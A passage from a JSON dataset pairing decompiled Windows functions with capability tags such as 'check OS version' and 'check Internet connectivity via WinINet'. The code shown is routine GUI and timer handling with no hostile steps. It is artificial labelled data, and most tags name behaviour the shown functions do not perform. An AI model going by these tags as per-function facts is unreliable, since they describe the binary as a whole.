        "decompiled_code": "\nvoid __cdecl fcn.00462438(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.00414ecc();\n        puVar1 = fcn.00402ce4();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.00414d8c();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00462494": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462494(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xb0) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00414eec();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.00402d00();\n                    fcn.00414dd8();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00462510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00462510(void)\n\n{\n    if (**0x492a9c != NULL) {\n        (***0x492a9c)();\n    }\n    return;\n}\n",
        "token_count": 40
    },
    "00462528": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462528(int32_t **param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x46253b;\n    piVar2 = (**(param_2 + -0xc))();\n    *param_1 = piVar2;\n    uStack28 = 0x462566;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    (**(*piVar2 + 0x2c))();\n    *in_FS_OFFSET = uStack32;\n    if (*(in_EAX + 0x44) == 0) {\n        puStack24 = 0x46258f;\n        cVar1 = fcn.004040e4();\n        if (cVar1 != '\\0') {\n            puStack24 = 0x46259c;\n            fcn.0044d1a4();\n            *(in_EAX + 0x44) = piVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "00462794": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462794(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t lpRect;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hWnd;\n    uint var_ch;\n    uint lpCaption;\n    int32_t var_4h;\n    \n    iStack108 = 0x4627b0;\n    var_4h = in_EAX;\n    iStack112 = fcn.00463b50();\n    iVar2 = iStack112;\n    if (iStack112 == 0) {\n        iVar2 = *(var_4h + 0x30);\n    }\n    iStack108 = 2;\n    uStack116 = 0x4627d3;\n    hWnd = iStack112;\n    var_18h = (***0x492a7c)();\n    uStack116 = 2;\n    uStack120 = *(var_4h + 0x30);\n    puStack124 = 0x4627e8;\n    var_1ch = (***0x492a7c)();\n    if (var_18h != var_1ch) {\n        var_48h = 0x28;\n        puStack124 = &fcn.00462794::var_48h;\n        iStack128 = var_18h;\n        iStack132 = 0x46280b;\n        (***0x4929b8)();\n        var_54h = &fcn.00462794::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        iStack112 = var_3ch - var_44h >> 1;\n        if (iStack112 < 0) {\n            iStack112 = iStack112 + ((var_3ch - var_44h & 1U) != 0);\n        }\n        iStack112 = iStack112 + var_44h;\n        uStack116 = 0;\n        uStack120 = *(var_4h + 0x30);\n        puStack124 = 0x462853;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack124 = 0x46285b;\n    var_14h = fcn.00458004();\n    puStack124 = 0x462863;\n    var_20h = fcn.00457f20();\n    puStack124 = 0x46286e;\n    cVar1 = fcn.00461534();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack128 = 0x4628fc;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    var_ch = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = iVar2;\n    if (var_18h != var_1ch) {\n        iVar2 = var_4ch - var_54h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_4ch - var_54h & 1U) != 0);\n        }\n        iVar3 = var_50h - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_50h - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_54h, 0, 0, 0x1d, 0x462903, arg_8h);\n    }\n    fcn.004580c8();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.00457f28();\n    return;\n}\n",
        "token_count": 1100
    },
    "00462910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00462949)\n// WARNING: Removing unreachable block (ram,0x00462970)\n\nvoid fcn.00462910(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x4629cb;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.00404e38();\n    arg_8h = 0x10;\n    fcn.00461fec();\n    uVar1 = fcn.00405264();\n    fcn.00405264(uVar1);\n    fcn.00462794(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x4629d2;\n    uStack288 = 0x4629c2;\n    fcn.00404da0();\n    uStack288 = 0x4629ca;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 282
    },
    "004629e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004629e8(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    char cStack28;\n    uint uStack24;\n    \n    iVar4 = 0;\n    uStack24 = CONCAT31(uStack24._1_3_, 1);\n    arg_8h = &uStack24;\n    uVar3 = fcn.00462b0c(arg_8h);\n    cStack28 = param_1;\n    if (uVar3 == '\\0') {\n        iVar4 = *(*0x496588 + 0x68);\n        if ((*(iVar4 + 0x1c) & 0x10) != 0) {\n            cStack28 = '\\0';\n        }\n        if ((((iVar4 != 0) && (iVar2 = fcn.0044d400(),  iVar2 == -1)) && (*(iVar4 + 0x57) == '\\0')) &&\n           (*(iVar4 + 0x268) == 0)) {\n            cStack28 = '\\0';\n        }\n    }\n    if (cStack28 != '\\0') {\n        if (((iVar4 != 0) && (cVar1 = fcn.0044d568(),  cVar1 != '\\0')) && (*(iVar4 + 0x284) != 0)) {\n            uStack24 = fcn.0044d1c8();\n            cVar1 = fcn.004631bc();\n            if (cVar1 == '\\0') {\n                return uVar3;\n            }\n            uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            return uVar3;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xac) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2 & 0xffff, arg_8h);\n            }\n        }\n        else {\n            uStack24 = *(in_EAX + 0x30);\n            if (*(in_EAX + 0x44) != 0) {\n                uStack24 = fcn.0044d1c8();\n            }\n            cVar1 = fcn.004631bc();\n            if (cVar1 != '\\0') {\n                uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 612
    },
    "00462b0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00462b0c(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar2 = 0;\n    *arg_8h = 1;\n    iVar3 = 0;\n    if (*(*0x496588 + 100) != 0) {\n        iVar3 = fcn.00458424();\n        if ((iVar3 != 0) && (*(iVar3 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar3 + 0x2f0))(arg_8h);\n        }\n    }\n    if (uVar2 == '\\0') {\n        iVar1 = *(*0x496588 + 0x68);\n        if ((((iVar1 != 0) && (iVar3 != iVar1)) && (iVar1 != 0)) && (*(iVar1 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar1 + 0x2f0))(arg_8h);\n        }\n        if ((uVar2 == '\\0') && (*(in_EAX + 0x11a) != 0)) {\n            uVar2 = (**(in_EAX + 0x118))(arg_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 318
    },
    "00462bd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00462bd8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00462bd8::var_1h + 1;\n    uStack32 = 0x462c56;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00462bd8::var_1h;\n    fcn.00405264();\n    fcn.00462b0c(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.004631bc(),  cVar1 != '\\0')) {\n        fcn.00463b14();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x462c5d;\n    iStack36 = 0x462c55;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 314
    },
    "00462c68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00462c68(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00462c68::var_1h + 1;\n    uStack32 = 0x462cdf;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00462c68::var_1h;\n    fcn.00462b0c(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.004631bc(),  cVar1 != '\\0')) {\n        fcn.00463b14();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x462ce6;\n    iStack36 = 0x462cde;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 305
    },
    "00462de0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00462de0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x496584 != 0) {\n        uStack24 = 0x462e25;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        uVar1 = 0;\n        sub.user32.dll_KillTimer(0, *0x4965a4);\n        *0x4965a4 = 0;\n        fcn.00462d58();\n        *in_FS_OFFSET = uVar1;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00462e48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00462e48(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x462f95;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x462e72;\n    fcn.00462dbc();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x462e91;\n        fcn.00463414();\n    }\n    puStack48 = 0x462e9b;\n    fcn.00460894();\n    puStack48 = 0x462ea6;\n    fcn.00442288();\n    puStack48 = 0x462eb3;\n    fcn.00463044();\n    bVar1 = true;\n    uStack52 = 0x462f3c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x12a) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0xc0) < 1) {\n        fcn.00462d58();\n    }\n    else if ((*0x4965a4 == 0) &&\n            (*0x4965a4 = sub.user32.dll_SetTimer(0, 0, *(in_EAX + 0xc0), fcn.00462de0),  *0x4965a4 == 0)) {\n        fcn.00462d58();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x462f56;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x492d04) {\n        puStack48 = 0x462f67;\n        cVar2 = fcn.0041b334();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x462f7a;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x462f9c;\n    uStack40 = 0x462f94;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 667
    },
    "00463044": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00463044(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x463058;\n    fcn.004051b0();\n    if (!in_ZF) {\n        puStack20 = 0x463064;\n        fcn.00404df4();\n        if (*(in_EAX + 0x122) == 0) {\n            puStack20 = 0x46308c;\n            fcn.004377a0();\n            puStack20 = 0x463099;\n            fcn.00455b28();\n            uStack24 = 0x4630c9;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.00404154();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x4630d0;\n            uStack24 = 0x4630c8;\n            fcn.00403f58();\n            return;\n        }\n        puStack20 = 0x46307c;\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "004630d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004630d8(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x491860) && (in_AL != *0x491860)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x491864));\n        *0x491860 = in_AL;\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "00463134": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00463134(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.0045fc80();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.0045fc6c();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 0x1c4) == 0) || (cVar1 = fcn.0044d568(),  cVar1 == '\\0')) {\ncode_r0x0046319b:\n                        fcn.004630d8(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.0044d1c8(*(iVar3 + 0x1c4));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x0046319b;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.004630d8(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "004631bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004631bc(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX;\n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.00406570();\n        uVar1 = fcn.0041ce08();\n    }\n    return uVar1 & 0xffffff00 | *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 107
    },
    "004631dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004631dc(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.00463220();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.004608ec);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.00463414();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00463414": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00463414(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.004633a0();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.00460a54();\n        fcn.00463220();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0046344c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0046344c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x463460;\n    var_4h = (***0x4929e4)();\n    puStack64 = &fcn.0046344c::var_28h;\n    uStack68 = 0x46346c;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x463472;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x463590;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x463496;\n        puStack72 = &stack0xfffffffc;\n        fcn.00422f4c();\n        puStack84 = 0x4634a1;\n        iVar2 = fcn.00402ccc();\n        uStack88 = 0x463561;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.00423008(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.0046343c();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                var_4h = fcn.0046343c();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x463568;\n        iStack92 = 0x463560;\n        iVar2 = fcn.00402d00();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 724
    },
    "00463604": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463604(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4636a2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_8h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040d1c0();\n            }\n            fcn.00404e90();\n            iVar2 = fcn.00421ac0();\n            if (var_8h < iVar2) {\n                var_8h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4636a9;\n    uStack32 = 0x4636a1;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 359
    },
    "004636b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004636b4(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_6dh;\n    int32_t var_65h;\n    char var_5dh;\n    uint lpPoint;\n    uint var_58h;\n    uint dx;\n    uint dy;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lprc;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4ch = *param_2;\n    var_48h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00405810();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    var_14h = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        cVar2 = fcn.004581e0();\n        if (cVar2 != '\\0') {\n            fcn.00443aec();\n            iVar4 = fcn.004608cc();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_44h = *(var_4h + 0x60);\n                var_3ch = var_4ch;\n                var_38h = var_48h;\n                iVar4 = fcn.0046344c();\n                var_38h = var_38h + iVar4;\n                var_34h = fcn.0045fc00();\n                var_30h = *(var_4h + 0x5c);\n                fcn.00444ebc();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_58h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004040e4();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x1c4) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.004450dc();\n                fcn.00460894();\n                fcn.00442244();\n                fcn.00404e38();\n                var_10h = *(var_4h + 0x74);\n                var_40h = *0x491734;\n                var_8h = 0;\n                arg_8h = &var_44h;\n                iVar4 = fcn.00446870(arg_8h);\n                var_5dh = iVar4 == 0;\n                if ((var_5dh) && (*(var_4h + 0x15a) != 0)) {\n                    (**(var_4h + 0x158))(&var_44h);\n                }\n                if ((var_5dh == '\\0') || (*(var_4h + 0x60) == 0)) 